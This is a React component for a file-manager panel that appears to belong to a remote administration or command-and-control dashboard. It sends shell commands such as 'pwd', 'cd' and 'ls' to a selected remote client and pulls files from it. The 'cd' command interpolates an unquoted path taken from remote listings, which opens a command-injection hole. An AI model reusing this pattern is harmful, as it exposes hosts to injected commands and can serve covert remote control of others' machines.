import React, { useState, useEffect, useRef } from 'react';
import styled from 'styled-components';
import { 
  FiFolder, 
  FiFile, 
  FiUpload, 
  FiDownload, 
  FiTrash2, 
  FiRefreshCw,
  FiSearch,
  FiGrid,
  FiList,
  FiHome,
  FiArrowLeft,
  FiCopy,
  FiEdit,
  FiFileText,
  FiImage,
  FiMusic,
  FiVideo,
  FiArchive,
  FiCode,
  FiDatabase
} from 'react-icons/fi';
import { toast } from 'react-toastify';

const FileManagerContainer = styled.div`
  background: #0a0a0a;
  border-radius: 12px;
  border: 1px solid #333;
  height: calc(100vh - 140px);
  display: flex;
  flex-direction: column;
  overflow: hidden;
`;

const Header = styled.div`
  background: linear-gradient(90deg, #1a1a1a 0%, #2d2d2d 100%);
  border-bottom: 1px solid #333;
  padding: 16px 20px;
  display: flex;
  align-items: center;
  justify-content: space-between;
`;

const HeaderLeft = styled.div`
  display: flex;
  align-items: center;
  gap: 16px;
`;

const Breadcrumb = styled.div`
  display: flex;
  align-items: center;
  gap: 8px;
  color: #888;
  font-size: 14px;

  .separator {
    color: #666;
  }
`;

const BreadcrumbItem = styled.span`
  cursor: pointer;
  color: #00ff88;
  
  &:hover {
    text-decoration: underline;
  }
`;

const HeaderRight = styled.div`
  display: flex;
  align-items: center;
  gap: 12px;
`;

const SearchBox = styled.input`
  background: #0a0a0a;
  border: 1px solid #333;
  color: #fff;
  padding: 8px 12px;
  border-radius: 6px;
  font-size: 14px;
  width: 200px;
  outline: none;

  &:focus {
    border-color: #00ff88;
  }

  &::placeholder {
    color: #666;
  }
`;

const ActionButton = styled.button`
  background: rgba(0, 255, 136, 0.2);
  border: 1px solid #00ff88;
  color: #00ff88;
  padding: 8px 16px;
  border-radius: 6px;
  cursor: pointer;
  display: flex;
  align-items: center;
  gap: 8px;
  font-size: 14px;
  transition: all 0.2s;

  &:hover {
    background: rgba(0, 255, 136, 0.3);
  }

  &.primary {
    background: linear-gradient(135deg, #00ff88, #00cc6a);
    color: #000;
    border: none;

    &:hover {
      transform: translateY(-1px);
    }
  }

  &:disabled {
    opacity: 0.5;
    cursor: not-allowed;
  }
`;

const Toolbar = styled.div`
  background: #1a1a1a;
  border-bottom: 1px solid #333;
  padding: 12px 20px;
  display: flex;
  align-items: center;
  justify-content: space-between;
`;

const ViewControls = styled.div`
  display: flex;
  align-items: center;
  gap: 8px;
`;

const ViewButton = styled.button`
  background: ${props => props.active ? '#00ff88' : 'transparent'};
  border: 1px solid ${props => props.active ? '#00ff88' : '#333'};
  color: ${props => props.active ? '#000' : '#ccc'};
  padding: 6px 12px;
  border-radius: 6px;
  cursor: pointer;
  display: flex;
  align-items: center;
  gap: 6px;
  font-size: 12px;
  transition: all 0.2s;

  &:hover {
    background: ${props => props.active ? '#00ff88' : 'rgba(255, 255, 255, 0.1)'};
  }
`;

const FileArea = styled.div`
  flex: 1;
  padding: 20px;
  overflow-y: auto;
`;

const FileGrid = styled.div`
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(120px, 1fr));
  gap: 16px;
`;

const FileItem = styled.div`
  background: rgba(255, 255, 255, 0.03);
  border: 1px solid #333;
  border-radius: 8px;
  padding: 16px;
  cursor: pointer;
  transition: all 0.2s;
  text-align: center;

  &:hover {
    background: rgba(0, 255, 136, 0.1);
    border-color: #00ff88;
  }
`;

const FileIcon = styled.div`
  font-size: 32px;
  color: ${props => props.color || '#00ff88'};
  margin-bottom: 8px;
`;

const FileName = styled.div`
  color: #fff;
  font-size: 12px;
  font-weight: 500;
  margin-bottom: 4px;
  word-break: break-word;
`;

const FileSize = styled.div`
  color: #888;
  font-size: 10px;
`;

const FileList = styled.div`
  display: flex;
  flex-direction: column;
  gap: 8px;
`;

const FileRow = styled.div`
  background: rgba(255, 255, 255, 0.03);
  border: 1px solid #333;
  border-radius: 8px;
  padding: 12px 16px;
  display: flex;
  align-items: center;
  gap: 16px;
  cursor: pointer;
  transition: all 0.2s;

  &:hover {
    background: rgba(0, 255, 136, 0.1);
    border-color: #00ff88;
  }
`;

const FileRowIcon = styled.div`
  font-size: 20px;
  color: ${props => props.color || '#00ff88'};
  width: 24px;
  text-align: center;
`;

const FileRowInfo = styled.div`
  flex: 1;
  min-width: 0;
`;

const FileRowName = styled.div`
  color: #fff;
  font-weight: 500;
  margin-bottom: 2px;
  white-space: nowrap;
  overflow: hidden;
  text-overflow: ellipsis;
`;

const FileRowDetails = styled.div`
  color: #888;
  font-size: 12px;
  display: flex;
  gap: 16px;
`;

const FileRowActions = styled.div`
  display: flex;
  gap: 8px;
  opacity: 0;
  transition: opacity 0.2s;

  ${FileRow}:hover & {
    opacity: 1;
  }
`;

const EmptyState = styled.div`
  text-align: center;
  padding: 60px 20px;
  color: #666;

  .icon {
    font-size: 64px;
    margin-bottom: 20px;
    opacity: 0.5;
  }

  h3 {
    font-size: 24px;
    margin-bottom: 12px;
    color: #888;
  }

  p {
    font-size: 16px;
    line-height: 1.5;
  }
`;

const LoadingSpinner = styled.div`
  display: flex;
  align-items: center;
  justify-content: center;
  padding: 40px;
  color: #666;
  font-size: 14px;
  gap: 10px;

  .spinner {
    animation: spin 1s linear infinite;
  }

  @keyframes spin {
    from { transform: rotate(0deg); }
    to { transform: rotate(360deg); }
  }
`;

const FileManager = ({ client, socket }) => {
  const [currentPath, setCurrentPath] = useState('');
  const [files, setFiles] = useState([]);
  const [viewMode, setViewMode] = useState('list');
  const [searchTerm, setSearchTerm] = useState('');
  const [loading, setLoading] = useState(false);
  const [breadcrumbs, setBreadcrumbs] = useState([]);
  const [osType, setOsType] = useState('unknown');
  const commandResponseRef = useRef(null);

  // Listen for command responses
  useEffect(() => {
    if (!socket) return;

    const handleCommandResponse = (data) => {
      if (data.clientId === client?.id && commandResponseRef.current) {
        commandResponseRef.current(data.response);
      }
    };

    socket.on('commandResponse', handleCommandResponse);
    return () => socket.off('commandResponse', handleCommandResponse);
  }, [socket, client]);

  // Initialize file manager when client is selected
  useEffect(() => {
    if (client && socket) {
      // Fetch OS info first to choose safe defaults
      fetchOsInfo(() => loadCurrentDirectory());
    }
  }, [client, socket]);

  const fetchOsInfo = (next) => {
    if (!socket || !client) return next && next();
    const handler = (data) => {
      if (data.clientId !== client.id) return;
      const text = String(data.response || '');
      const match = text.match(/OS:\s*(\S+)/i);
      if (match && match[1]) {
        setOsType(match[1].toLowerCase());
      }
      socket.off('commandResponse', handler);
      next && next();
    };
    socket.on('commandResponse', handler);
    socket.emit('executeCommand', { clientId: client.id, command: 'sysinfo' });
  };

  const loadCurrentDirectory = () => {
    if (!client || !socket) return;
    setLoading(true);
    commandResponseRef.current = (response) => {
      try {
        const path = String(response || '').trim();
        const invalid = !path || /^Command failed/i.test(path);
        const defaultPath = osType.includes('windows') ? 'C:\\' : '/';
        const nextPath = invalid ? defaultPath : path;
        setCurrentPath(nextPath);
        updateBreadcrumbs(nextPath);
        // Chain: now list files in this directory
        loadFiles(nextPath);
      } catch (e) {
        setLoading(false);
      }
    };
    socket.emit('executeCommand', {
      clientId: client.id,
      command: 'pwd'
    });
  };

  const loadFiles = (path = '') => {
    if (!client || !socket) return;
    
    setLoading(true);
    // Step 1: cd into the path (if provided)
    const targetPath = path || currentPath;
    const sendList = () => {
      commandResponseRef.current = (response) => {
        parseDirectoryResponse(response, targetPath);
        setLoading(false);
      };
      const listCmd = targetPath ? `ls "${targetPath}"` : 'ls';
      socket.emit('executeCommand', { clientId: client.id, command: listCmd });
    };
    if (targetPath) {
      // Run cd first; ignore its output, then list
      const cdCmd = `cd ${targetPath}`;
      const cdHandler = () => {
        socket.off('commandResponse', cdHandler);
        sendList();
      };
      socket.on('commandResponse', cdHandler);
      socket.emit('executeCommand', { clientId: client.id, command: cdCmd });
      // Safety timeout fallback to ensure we still list
      setTimeout(() => {
        try { socket.off('commandResponse', cdHandler); } catch (e) {}
        sendList();
      }, 1200);
    } else {
      sendList();
    }
  };

  const parseDirectoryResponse = (response, targetPath = '') => {
    try {
      const lines = response.split('\n');
      let path = '';
      let fileList = [];

      // Extract directory path from first line
      for (const line of lines) {
        if (line.startsWith('Directory:')) {
          path = line.replace('Directory:', '').trim();
          break;
        }
      }

      if (!path) {
        path = targetPath || currentPath || '';
      }

      // Parse file entries
      for (const line of lines) {
        if (line.includes('\t') && (line.includes('<DIR>') || line.includes('FILE'))) {
          const parts = line.split('\t');
          if (parts.length >= 4) {
            const type = parts[0].trim();
            const name = parts[1].trim();
            const size = parts[2].trim();
            const modified = parts[3].trim();

            if (name && name !== '') {
              fileList.push({
                name: name,
                isDirectory: type === '<DIR>',
                size: size,
                modified: modified,
                path: buildPath(path, name),
                type: getFileType(name)
              });
            }
          }
        }
      }

      if (path) setCurrentPath(path);
      setFiles(fileList);
      updateBreadcrumbs(path);
    } catch (error) {
      console.error('Error parsing directory response:', error);
      toast.error('Failed to parse directory listing');
      setFiles([]);
    }
  };

  const getSep = () => (osType.includes('windows') ? '\\' : '/');

  const buildPath = (base, name) => {
    const sep = getSep();
    if (!base) return name;
    // If base already ends with sep, avoid double
    const normalized = base.endsWith(sep) ? base.slice(0, -1) : base;
    return `${normalized}${sep}${name}`;
  };

  const getFileType = (filename) => {
    const ext = filename.toLowerCase().split('.').pop();
    const imageExts = ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'svg', 'ico'];
    const videoExts = ['mp4', 'avi', 'mov', 'wmv', 'flv', 'webm', 'mkv'];
    const audioExts = ['mp3', 'wav', 'flac', 'aac', 'ogg', 'wma'];
    const archiveExts = ['zip', 'rar', '7z', 'tar', 'gz', 'bz2'];
    const codeExts = ['js', 'ts', 'html', 'css', 'py', 'java', 'cpp', 'c', 'go', 'php'];
    const docExts = ['txt', 'doc', 'docx', 'pdf', 'rtf'];

    if (imageExts.includes(ext)) return 'image';
    if (videoExts.includes(ext)) return 'video';
    if (audioExts.includes(ext)) return 'audio';
    if (archiveExts.includes(ext)) return 'archive';
    if (codeExts.includes(ext)) return 'code';
    if (docExts.includes(ext)) return 'document';
    return 'file';
  };

  const getFileIcon = (file) => {
    if (file.isDirectory) {
      return <FiFolder />;
    }

    switch (file.type) {
      case 'image': return <FiImage />;
      case 'video': return <FiVideo />;
      case 'audio': return <FiMusic />;
      case 'archive': return <FiArchive />;
      case 'code': return <FiCode />;
      case 'document': return <FiFileText />;
      default: return <FiFile />;
    }
  };

  const getFileIconColor = (file) => {
    if (file.isDirectory) return '#ffc107';
    
    switch (file.type) {
      case 'image': return '#28a745';
      case 'video': return '#dc3545';
      case 'audio': return '#6f42c1';
      case 'archive': return '#fd7e14';
      case 'code': return '#17a2b8';
      case 'document': return '#6c757d';
      default: return '#00ff88';
    }
  };

  const updateBreadcrumbs = (path) => {
    if (!path) {
      setBreadcrumbs([]);
      return;
    }

    const sep = getSep();
    const parts = path.split(sep).filter(p => p !== '');
    const crumbs = [];
    
    // Add root
    crumbs.push({ name: 'Root', path: osType.includes('windows') ? 'C:\\' : '/' });
    
    // Add path parts
    let currentPath = osType.includes('windows') ? 'C:\\' : '';
    for (const part of parts) {
      currentPath += (currentPath && !currentPath.endsWith(getSep()) ? getSep() : '') + part;
      crumbs.push({ name: part, path: currentPath });
    }
    
    setBreadcrumbs(crumbs);
  };

  const navigateToPath = (path) => {
    setCurrentPath(path);
    loadFiles(path);
  };

  const goBack = () => {
    if (breadcrumbs.length > 1) {
      const parentPath = breadcrumbs[breadcrumbs.length - 2].path;
      navigateToPath(parentPath);
    }
  };

  const handleFileClick = (file) => {
    if (file.isDirectory) {
      navigateToPath(file.path);
    } else {
      handleFileDownload(file.name);
    }
  };

  const handleFileUpload = () => {
    const input = document.createElement('input');
    input.type = 'file';
    input.multiple = true;
    input.onchange = (e) => {
      const files = Array.from(e.target.files);
      files.forEach(file => {
        // Upload logic would go here
        toast.success(`Uploading ${file.name}...`);
      });
    };
    input.click();
  };

  const handleFileDownload = (fileName) => {
    if (!client || !socket) return;
    
    socket.emit('downloadFile', {
      clientId: client.id,
      filename: fileName
    });
    toast.success(`Downloading ${fileName}...`);
  };

  const filteredFiles = files.filter(file => 
    file.name.toLowerCase().includes(searchTerm.toLowerCase())
  );

  if (!client) {
    return (
      <FileManagerContainer>
        <EmptyState>
          <FiFolder className="icon" />
          <h3>No Client Selected</h3>
          <p>Select a client to manage files</p>
        </EmptyState>
      </FileManagerContainer>
    );
  }

  return (
    <FileManagerContainer>
      <Header>
        <HeaderLeft>
          <Breadcrumb>
            <FiHome />
            {breadcrumbs.map((crumb, index) => (
              <React.Fragment key={index}>
                <span className="separator">/</span>
                <BreadcrumbItem onClick={() => navigateToPath(crumb.path)}>
                  {crumb.name}
                </BreadcrumbItem>
              </React.Fragment>
            ))}
          </Breadcrumb>
        </HeaderLeft>
        
        <HeaderRight>
          <SearchBox
            placeholder="Search files..."
            value={searchTerm}
            onChange={(e) => setSearchTerm(e.target.value)}
          />
          <ActionButton onClick={loadCurrentDirectory} disabled={loading}>
            <FiRefreshCw />
            Refresh
          </ActionButton>
        </HeaderRight>
      </Header>

      <Toolbar>
        <ActionButton onClick={goBack} disabled={breadcrumbs.length <= 1}>
          <FiArrowLeft />
          Back
        </ActionButton>
        
        <ActionButton onClick={handleFileUpload} className="primary">
          <FiUpload />
          Upload
        </ActionButton>

        <ViewControls>
          <ViewButton
            active={viewMode === 'grid'}
            onClick={() => setViewMode('grid')}
          >
            <FiGrid />
            Grid
          </ViewButton>
          <ViewButton
            active={viewMode === 'list'}
            onClick={() => setViewMode('list')}
          >
            <FiList />
            List
          </ViewButton>
        </ViewControls>
      </Toolbar>

      <FileArea>
        {loading ? (
          <LoadingSpinner>
            <FiRefreshCw className="spinner" />
            Loading directory...
          </LoadingSpinner>
        ) : filteredFiles.length === 0 ? (
          <EmptyState>
            <FiFolder className="icon" />
            <h3>No Files Found</h3>
            <p>This directory is empty or files are loading</p>
          </EmptyState>
        ) : viewMode === 'grid' ? (
          <FileGrid>
            {filteredFiles.map((file, index) => (
              <FileItem key={index} onClick={() => handleFileClick(file)}>
                <FileIcon color={getFileIconColor(file)}>
                  {getFileIcon(file)}
                </FileIcon>
                <FileName>{file.name}</FileName>
                <FileSize>{file.size}</FileSize>
              </FileItem>
            ))}
          </FileGrid>
        ) : (
          <FileList>
            {filteredFiles.map((file, index) => (
              <FileRow key={index} onClick={() => handleFileClick(file)}>
                <FileRowIcon color={getFileIconColor(file)}>
                  {getFileIcon(file)}
                </FileRowIcon>
                <FileRowInfo>
                  <FileRowName>{file.name}</FileRowName>
                  <FileRowDetails>
                    <span>{file.size}</span>
                    <span>{file.modified}</span>
                  </FileRowDetails>
                </FileRowInfo>
                <FileRowActions>
                  {!file.isDirectory && (
                    <ActionButton onClick={(e) => {
                      e.stopPropagation();
                      handleFileDownload(file.name);
                    }}>
                      <FiDownload />
                    </ActionButton>
                  )}
                  <ActionButton onClick={(e) => {
                    e.stopPropagation();
                    navigator.clipboard.writeText(file.path);
                    toast.success('Path copied to clipboard');
                  }}>
                    <FiCopy />
                  </ActionButton>
                </FileRowActions>
              </FileRow>
            ))}
          </FileList>
        )}
      </FileArea>
    </FileManagerContainer>
  );
};

export default FileManager;